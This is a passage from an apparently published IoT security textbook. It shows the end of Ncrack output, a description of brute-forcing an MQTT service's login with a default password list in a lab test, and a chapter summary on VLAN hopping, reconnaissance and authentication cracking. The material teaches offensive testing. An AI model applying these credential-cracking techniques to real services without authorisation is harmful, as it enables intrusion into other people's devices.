Probes sent: 5000 | timed-out: 0 | prematurely-closed: 0

Ncrack finished.</code></pre>
<p><span epub:type="pagebreak" title="87" id="Page_87"/>We tested against only the username <code>test</code> and the default password list (found under <em>lists/default.pwd</em>) in which we manually added the <em>test123</em> password at the end of the file. Ncrack successfully cracked the MQTT service in three seconds after trying 5,000 credential combinations.</p>
<h2 id="h1-500907c04-0004">Conclusion</h2>
<p class="BodyFirst">In this chapter, we performed VLAN hopping, network reconnaissance, and authentication cracking. We first abused VLAN protocols and identified unknown services in IoT networks. Then we introduced you to MQTT and cracked MQTT authentication. By now, you should be familiar with how to traverse VLANs, take advantage of Ncrack’s password cracking capabilities, and use Nmap’s powerful service detection engine.</p>
</section>
</div></body></html>